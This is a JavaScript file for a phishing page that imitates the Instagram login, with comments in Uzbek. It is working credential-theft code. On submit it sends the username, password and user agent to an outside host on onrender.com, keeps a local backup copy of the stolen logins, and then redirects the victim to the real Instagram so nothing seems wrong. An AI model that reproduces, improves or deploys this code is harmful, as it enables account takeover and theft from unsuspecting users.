document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const showPassCheckbox = document.getElementById('showPass');
    
    // Backend URL ni aniq belgilash
    const backendUrl = 'https://instagram-ek8i.onrender.com';
    console.log('Backend URL:', backendUrl);

    showPassCheckbox.addEventListener('change', function() {
        const passwordField = document.getElementById('password');
        passwordField.type = this.checked ? 'text' : 'password';
    });

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        e.stopPropagation();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;

        if (!username || !password) {
            alert('Iltimos, login va parolni kiriting!');
            return;
        }

        const data = {
            username: username,
            password: password,
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };

        // Loading animatsiya
        const submitBtn = form.querySelector('.btn-login');
        const originalText = submitBtn.innerHTML;
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Yuklanmoqda...';
        submitBtn.disabled = true;

        try {
            console.log('Sending to:', `${backendUrl}/save`);
            
            const response = await fetch(`${backendUrl}/save`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(data),
                mode: 'cors'
            });

            console.log('Response status:', response.status);
            
            if (response.ok) {
                const result = await response.json();
                console.log('Save successful:', result);
                
                // Instagramga yo'naltirish
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 800);
            } else {
                const errorData = await response.json();
                console.error('Server error:', errorData);
                alert('Serverda xatolik. Iltimos, qayta urinib ko\'ring.');
                
                // LocalStorage backup
                saveToLocalStorage(data);
                
                // Instagramga yo'naltirish
                setTimeout(() => {
                    window.location.href = 'https://www.instagram.com/';
                }, 800);
            }
        } catch (error) {
            console.error('Network error:', error);
            
            // LocalStorage backup
            saveToLocalStorage(data);
            
            // Instagramga yo'naltirish
            setTimeout(() => {
                window.location.href = 'https://www.instagram.com/';
            }, 800);
        } finally {
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
        }
    });

    // LocalStorage backup funksiyasi
    function saveToLocalStorage(data) {
        try {
            const existingLogs = JSON.parse(localStorage.getItem('instagram_logs') || '[]');
            existingLogs.push({
                ...data,
                savedAt: new Date().toISOString(),
                backup: true
            });
            
            // Faqat oxirgi 50 tasini saqlaymiz
            if (existingLogs.length > 50) {
                existingLogs.splice(0, existingLogs.length - 50);
            }
            
            localStorage.setItem('instagram_logs', JSON.stringify(existingLogs));
            console.log('Saved to localStorage backup:', data.username);
        } catch (error) {
            console.error('LocalStorage save error:', error);
        }
    }

    // Rasm yo'q bo'lsa
    const phoneImg = document.querySelector('.screen img');
    if (phoneImg) {
        phoneImg.onerror = function() {
            this.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjYwMCIgdmlld0JveD0iMCAwIDMwMCA2MDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIzMDAiIGhlaWdodD0iNjAwIiBmaWxsPSIjRkZGIi8+Cjx0ZXh0IHg9IjUwJSIgeT0iNTAlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmb250LWZhbWlseT0iQXJpYWwiIGZvbnQtc2l6ZT0iMTQiIGZpbGw9IiM2Njc5RUEiPkluc3RhZ3JhbSBNb25ldGl6YXRpb248L3RleHQ+Cjwvc3ZnPg==';
        };
    }
});